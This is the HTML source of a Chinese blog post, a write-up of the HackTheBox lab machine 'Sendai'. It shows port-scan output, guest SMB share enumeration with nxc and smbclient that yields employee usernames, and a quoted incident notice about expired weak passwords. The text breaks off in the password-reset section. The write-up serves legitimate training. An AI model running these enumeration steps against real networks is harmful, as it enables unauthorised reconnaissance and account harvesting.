@@ -1,0 +1,1129 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="初始侦察\r┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sendai] └─$ cat rustscan.txt .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- Breaking and entering... into the world of open ports. [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.129.234.66:53 Open 10.129.234.66:80 Open 10.129.234.66:88 Open 10.129.234.66:135 Open 10.129.234.66:139 Open 10.129.234.66:389 Open 10.129.234.66:443 Open 10.129.234.66:445 Open 10.129.234.66:464 Open 10.129.234.66:593 Open 10.129.234.66:636 Open 10.129.234.66:3269 Open 10.129.234.66:3268 Open 10.129.234.66:3389 Open 10.129.234.66:5985 Open 10.129.234.66:9389 ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sendai] └─$ cat hostname 10.129.234.66 DC.sendai.vl sendai.vl DC ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sendai] └─$ cat start.sh ip=10.129.234.66 80和443虽然开启，但都是iis初始页面，先不着急\n">
+<title>sendai-wp</title>
+
+<link rel='canonical' href='http://localhost:1313/post/sendai/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="sendai-wp">
+<meta property='og:description' content="初始侦察\r┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sendai] └─$ cat rustscan.txt .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- Breaking and entering... into the world of open ports. [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.129.234.66:53 Open 10.129.234.66:80 Open 10.129.234.66:88 Open 10.129.234.66:135 Open 10.129.234.66:139 Open 10.129.234.66:389 Open 10.129.234.66:443 Open 10.129.234.66:445 Open 10.129.234.66:464 Open 10.129.234.66:593 Open 10.129.234.66:636 Open 10.129.234.66:3269 Open 10.129.234.66:3268 Open 10.129.234.66:3389 Open 10.129.234.66:5985 Open 10.129.234.66:9389 ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sendai] └─$ cat hostname 10.129.234.66 DC.sendai.vl sendai.vl DC ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sendai] └─$ cat start.sh ip=10.129.234.66 80和443虽然开启，但都是iis初始页面，先不着急\n">
+<meta property='og:url' content='http://localhost:1313/post/sendai/'>
+<meta property='og:site_name' content='wackymaker'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='靶机' /><meta property='article:tag' content='htb' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-09-18T21:40:42&#43;08:00'/><meta property='article:modified_time' content='2025-09-18T21:40:42&#43;08:00'/>
+<meta name="twitter:title" content="sendai-wp">
+<meta name="twitter:description" content="初始侦察\r┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sendai] └─$ cat rustscan.txt .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- Breaking and entering... into the world of open ports. [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.129.234.66:53 Open 10.129.234.66:80 Open 10.129.234.66:88 Open 10.129.234.66:135 Open 10.129.234.66:139 Open 10.129.234.66:389 Open 10.129.234.66:443 Open 10.129.234.66:445 Open 10.129.234.66:464 Open 10.129.234.66:593 Open 10.129.234.66:636 Open 10.129.234.66:3269 Open 10.129.234.66:3268 Open 10.129.234.66:3389 Open 10.129.234.66:5985 Open 10.129.234.66:9389 ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sendai] └─$ cat hostname 10.129.234.66 DC.sendai.vl sendai.vl DC ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sendai] └─$ cat start.sh ip=10.129.234.66 80和443虽然开启，但都是iis初始页面，先不着急\n">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_6baab66dae07af16.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">wackymaker</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/wackymaker'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#初始侦察">初始侦察</a></li>
+    <li><a href="#重置密码">重置密码</a></li>
+    <li><a href="#提权">提权</a></li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E9%A2%98%E7%9B%AEwp/" >
+                题目wp
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/sendai/">sendai-wp</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 18, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    15 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="初始侦察">初始侦察
+</h2><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat rustscan.txt 
+</span></span><span style="display:flex;"><span>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+</span></span><span style="display:flex;"><span>| <span style="color:#f92672">{}</span>  <span style="color:#f92672">}</span>| <span style="color:#f92672">{</span> <span style="color:#f92672">}</span> |<span style="color:#f92672">{</span> <span style="color:#f92672">{</span>__ <span style="color:#f92672">{</span>_   _<span style="color:#f92672">}{</span> <span style="color:#f92672">{</span>__  /  ___<span style="color:#f92672">}</span> / <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\ </span>|  <span style="color:#e6db74">`</span>| |
+</span></span><span style="display:flex;"><span>| .-. <span style="color:#ae81ff">\|</span> <span style="color:#f92672">{</span>_<span style="color:#f92672">}</span> |.-._<span style="color:#f92672">}</span> <span style="color:#f92672">}</span> | |  .-._<span style="color:#f92672">}</span> <span style="color:#f92672">}</span><span style="color:#ae81ff">\ </span>    <span style="color:#f92672">}</span>/  /<span style="color:#ae81ff">\ </span> <span style="color:#ae81ff">\|</span> |<span style="color:#ae81ff">\ </span> |
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39; `-&#39;</span><span style="color:#e6db74">`</span>-----<span style="color:#e6db74">&#39;`----&#39;</span>  <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;  `----&#39;</span>  <span style="color:#e6db74">`</span>---<span style="color:#e6db74">&#39; `-&#39;</span>  <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;`-&#39;</span> <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The Modern Day Port Scanner.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">________________________________________
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">: http://discord.skerritt.blog         :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">: https://github.com/RustScan/RustScan :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> --------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Breaking and entering... into the world of open ports.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] Your file limit is very small, which negatively impacts RustScan&#39;</span>s speed. Use the Docker image, or up the Ulimit with <span style="color:#e6db74">&#39;--ulimit 5000&#39;</span>. 
+</span></span><span style="display:flex;"><span>Open 10.129.234.66:53
+</span></span><span style="display:flex;"><span>Open 10.129.234.66:80
+</span></span><span style="display:flex;"><span>Open 10.129.234.66:88
+</span></span><span style="display:flex;"><span>Open 10.129.234.66:135
+</span></span><span style="display:flex;"><span>Open 10.129.234.66:139
+</span></span><span style="display:flex;"><span>Open 10.129.234.66:389
+</span></span><span style="display:flex;"><span>Open 10.129.234.66:443
+</span></span><span style="display:flex;"><span>Open 10.129.234.66:445
+</span></span><span style="display:flex;"><span>Open 10.129.234.66:464
+</span></span><span style="display:flex;"><span>Open 10.129.234.66:593
+</span></span><span style="display:flex;"><span>Open 10.129.234.66:636
+</span></span><span style="display:flex;"><span>Open 10.129.234.66:3269
+</span></span><span style="display:flex;"><span>Open 10.129.234.66:3268
+</span></span><span style="display:flex;"><span>Open 10.129.234.66:3389
+</span></span><span style="display:flex;"><span>Open 10.129.234.66:5985
+</span></span><span style="display:flex;"><span>Open 10.129.234.66:9389
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat hostname 
+</span></span><span style="display:flex;"><span>10.129.234.66     DC.sendai.vl sendai.vl DC
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat start.sh 
+</span></span><span style="display:flex;"><span>ip<span style="color:#f92672">=</span>10.129.234.66
+</span></span></code></pre></div><p>80和443虽然开启，但都是iis初始页面，先不着急</p>
+<p>存在匿名smb，看信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb <span style="color:#e6db74">&#34;</span>$ip<span style="color:#e6db74">&#34;</span> -u guest -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:sendai.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sendai.vl<span style="color:#ae81ff">\g</span>uest: 
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               config                          
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               IPC$            READ            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               NETLOGON                        Logon server share
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               sendai          READ            company share
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               SYSVOL                          Logon server share
+</span></span><span style="display:flex;"><span>SMB         10.129.234.66   <span style="color:#ae81ff">445</span>    DC               Users           READ            
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sendai<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>users目录没什么东西，但是sendai中我获得了一些用户名</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> cd transfer<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>smb: <span style="color:#ae81ff">\t</span>ransfer<span style="color:#ae81ff">\&gt;</span> dir
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">11</span> 09:00:20 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">18</span> 13:31:04 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  anthony.smith                       D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">11</span> 08:59:50 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  clifford.davey                      D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">11</span> 09:00:06 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  elliot.yates                        D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">11</span> 08:59:26 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  lisa.williams                       D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">11</span> 08:59:34 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  susan.harper                        D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">11</span> 08:59:39 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  temp                                D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">11</span> 09:00:16 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  thomas.powell                       D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">11</span> 08:59:45 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">7019007</span> blocks of size 4096. <span style="color:#ae81ff">855070</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\t</span>ransfer<span style="color:#ae81ff">\&gt;</span> cd ../
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> dir
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">18</span> 13:31:04 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  ..                                DHS        <span style="color:#ae81ff">0</span>  Tue Apr <span style="color:#ae81ff">15</span> 22:55:42 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  hr                                  D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">11</span> 08:58:19 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  incident.txt                        A     <span style="color:#ae81ff">1372</span>  Tue Jul <span style="color:#ae81ff">18</span> 13:34:15 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  it                                  D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">18</span> 09:16:46 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  legal                               D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">11</span> 08:58:23 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  security                            D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">18</span> 09:17:35 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  transfer                            D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">11</span> 09:00:20 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">7019007</span> blocks of size 4096. <span style="color:#ae81ff">853509</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get incident.txt 
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\i</span>ncident.txt of size <span style="color:#ae81ff">1372</span> as incident.txt <span style="color:#f92672">(</span>3.4 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 7.0 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> dir
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">18</span> 13:31:04 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  ..                                DHS        <span style="color:#ae81ff">0</span>  Tue Apr <span style="color:#ae81ff">15</span> 22:55:42 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  hr                                  D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">11</span> 08:58:19 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  incident.txt                        A     <span style="color:#ae81ff">1372</span>  Tue Jul <span style="color:#ae81ff">18</span> 13:34:15 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  it                                  D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">18</span> 09:16:46 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  legal                               D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">11</span> 08:58:23 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  security                            D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">18</span> 09:17:35 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  transfer                            D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">11</span> 09:00:20 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">7019007</span> blocks of size 4096. <span style="color:#ae81ff">852101</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> 
+</span></span></code></pre></div><h2 id="重置密码">重置密码
+</h2><p>还有一些文本文件，重点则是如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>事件通知（incident.txt）
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>亲爱的员工们：
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>希望您一切安好。我们在此通知一项关于用户账户密码的重要安全更新。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>近期，我们进行了全面的渗透测试，发现大量用户账户使用了弱且不安全的密码。
+</span></span><span style="display:flex;"><span>为了解决这一问题并维护公司内部最高等级的安全性，IT 部门已采取紧急措施：所有使用不安全密码的用户账户已被强制过期。
+</span></span><span style="display:flex;"><span>这意味着，受影响的用户在下次登录时必须重置密码。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>我们诚挚地请求所有受影响的用户尽快完成密码重置流程，以确保系统的安全性和完整性。请记住，强密码在保护敏感信息和抵御潜在威胁方面起着至关重要的作用。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>如果您在重置密码过程中需要帮助，或有任何相关问题，请随时联系 IT 支持团队。他们将非常乐意为您提供指导和必要的支持。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>感谢您为维护我们共同的安全环境所做的配合与努力。您对安全规范的警惕与遵守为我们的整体安全作出了重要贡献。
